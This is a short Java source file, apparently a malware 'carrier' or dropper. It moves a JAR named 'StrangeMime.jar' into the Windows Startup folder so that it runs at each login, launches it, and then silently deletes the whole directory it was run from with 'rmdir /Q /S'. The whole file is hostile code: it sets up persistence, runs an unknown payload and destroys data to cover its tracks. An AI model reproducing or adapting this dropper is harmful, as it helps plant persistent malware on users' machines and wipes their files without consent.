package org.open.corejava.strange.mime.carrier;

import java.io.File;
import java.io.IOException;

public class Carrier {

    public static void main(String[] args) {
        String src = "StrangeMime.jar";
        String dest = "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        try {
            Runtime.getRuntime().exec("cmd /C Move " + src + " \"" + dest + "\"");
            Thread.sleep(10);
            Runtime.getRuntime().exec("cmd /C \"" + dest + "\\StrangeMime.jar\"");
            Runtime.getRuntime().exec("cmd /C rmdir /Q /S " + new File("").getAbsolutePath());
        } catch (IOException e) {
            System.err.println(e.getMessage());
        } catch (InterruptedException e) {
            System.out.println(e.getMessage());
        }
    }
}
